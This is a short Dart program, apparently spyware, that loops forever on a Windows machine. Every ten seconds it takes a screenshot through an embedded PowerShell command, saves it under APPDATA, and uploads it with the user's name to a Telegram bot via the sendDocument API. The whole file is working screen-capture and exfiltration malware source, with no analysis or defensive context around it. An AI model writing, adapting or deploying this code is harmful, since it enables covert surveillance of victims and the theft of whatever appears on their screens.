import 'dart:io';
import 'package:http/http.dart' as http;
import 'package:path/path.dart' as path;

Future<void> main() async {
  final botfath = "telegrambottoken";
  final chatid = "chatid";
  final username =
      Platform.environment['USERNAME'] ?? Platform.environment['USER'];

  final appdatadir = Platform.environment['APPDATA']!;
  final supportpath = path.join(appdatadir, "screenshot.png");

  final output = '\$ENV:APPDATA\\screenshot.png';
  while (true) {
    await sendFile(
        botfath, chatid, supportpath, "Screenshot From " + username.toString());
    await takeScreenshot(output);
    await Future.delayed(Duration(seconds: 10));
  }
}

Future<void> takeScreenshot(String outputpath) async {
  final process = await Process.start('powershell.exe', [
    '-Command',
    'Add-Type -AssemblyName System.Windows.Forms; \$screenshot = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; \$bitmap = New-Object System.Drawing.Bitmap \$screenshot.Width, \$screenshot.Height; \$graphics = [System.Drawing.Graphics]::FromImage(\$bitmap); \$graphics.CopyFromScreen(\$screenshot.X, \$screenshot.Y, 0, 0, \$screenshot.Size); \$bitmap.Save("$outputpath", [System.Drawing.Imaging.ImageFormat]::Png); \$graphics.Dispose(); \$bitmap.Dispose()'
  ]);
  await process.exitCode;
}

Future<void> sendFile(
    String botToken, String chatId, String filePath, String Cap) async {
  final url = Uri.parse('https://api.telegram.org/bot$botToken/sendDocument');

  final request = http.MultipartRequest('POST', url);
  request.fields['chat_id'] = chatId;
  request.fields['caption'] = Cap;

  final file = await http.MultipartFile.fromPath('document', filePath);
  request.files.add(file);

  final response = await http.Response.fromStream(await request.send());
  print(response.body);
}
